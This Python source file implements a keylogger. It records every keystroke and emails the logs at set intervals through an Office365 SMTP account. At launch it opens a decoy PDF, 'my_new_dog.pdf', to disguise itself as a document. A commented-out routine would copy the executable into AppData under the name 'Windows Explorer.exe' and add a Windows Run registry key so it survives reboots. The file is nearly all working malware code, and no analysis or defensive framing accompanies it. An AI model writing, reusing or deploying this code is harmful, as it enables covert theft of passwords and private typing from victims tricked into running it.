#!/usr/bin/env python
# encoding=utf8
import keyboard # for keylogs
import threading
import smtplib # For sending email using SMTP protocol
import os # os commands support
import sys 
import shutil 
import subprocess # Add entry in Windows registry
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

class Keylogger:
    def __init__(self, time_interval, email, password):
        # self.system_boot()
        # Sends a report after every interval
        self.interval = time_interval
        # log of all the keystrokes within `self.interval`
        self.log = "Started Logging Keys..."
        # record start & end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        # Email and password of where the logs will be sent to
        self.email = email
        self.password = password

    # Automaticaslly runs after system reboot
    # def system_boot(self):
        # # Get users AppData location and then copy the executable to that location with an unsuspicious filename
        # keylogger_file_location = os.environ["AppData"] + "\\Windows Explorer.exe"
        # if not os.path.exists(keylogger_file_location):
        #     # Copy keylogger if not available on that location
        #     shutil.copyfile(sys.executable, keylogger_file_location)
        #     # Add an entry to the registry along with its location so that it will be invoked after every system reboot
        #     subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Update /t REG_SZ /d "' + keylogger_file_location + '"', shell=True)
        #     # Changes dir to My Executable Is a Package temporary extraction directory . 
        #     # When .exe is double clicked, the pdf will be extracted to this location
        #     os.chdir(sys._MEIPASS)
        #     # PDF location
        #     os.system('data_files\\my_new_dog.pdf')

    def append_to_log(self, string):
        self.log += string

    def process_key_press(self, event):
        key_name = event.name

        # Define a dictionary to map special key names to their replacements
        special_keys = {
            "space": " ",
            "enter": "[ENTER]\n",
            "decimal": ".",
        }

        # Check if the key name is a special key, otherwise format it
        key_name = special_keys.get(key_name, f"[{key_name.replace(' ', '_').upper()}]")

        # Add the key name to the log
        self.log += key_name

    def update_filename(self):
        # construct the email subject to be identified by start & end datetimes
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
        print(self.filename)

    def report(self):
        # Gets called every self.interval
        if self.log:
            # If there is something in log, report it
            self.end_dt = datetime.now()
            # update `self.filename`
            self.update_filename()
            # Send mail
            self.sendmail(self.email, self.password, self.log)
            print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        # Set timer 
        timer = threading.Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

    def prepare_mail(self, message):
        # Contructs MIMEMultipart from a text creates an HTML version and a text version to be sent to email
        msg = MIMEMultipart("alternative")
        # Sends to my email address
        msg['From'] = self.email
        msg["To"] = self.email
        msg["Subject"] = self.filename

        # Sends a simple message
        html = f"<div><h2>Key logs:</h2><p>{str(message)}</p></div>"
        text_part = MIMEText(message, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)

        # Message is then converted as a string
        return msg.as_string()

    def sendmail(self, email, password, message, verbose=1):
        try:
            # Attempt to create an SMTP connection
            server = smtplib.SMTP(host="smtp.office365.com", port=587)

            # Connect to SMTP server using TLS (for security)
            server.starttls()

            # Login to email account
            server.login(email, password)

            # send the actual message after preparation
            server.sendmail(email, email, self.prepare_mail(message))

        except smtplib.SMTPAuthenticationError:
            print("Error: Authentication failed. Please check your email and password.")

        except smtplib.SMTPException as e:
            print(f"Error: An SMTP error occurred - {e}")

        finally:
            # Close the SMTP connection in the finally block to ensure it's closed
            if 'server' in locals():
                server.quit()
        if verbose:
            print(f"{datetime.now()} - Sent an email to {email} containing:  {message}")

    def start(self):
        subprocess.run(['start', os.getcwd() + '\\data_files\\my_new_dog.pdf'], shell=True)
        # Record the start datetime
        self.start_dt = datetime.now()
        # Start the keylogger
        keyboard.on_release(callback=self.process_key_press)
        # Start reporting the keylogs
        self.report()
        print(f"{datetime.now()} - Started keylogger")
        # Waits until Ctrl-C is pressed
        keyboard.wait()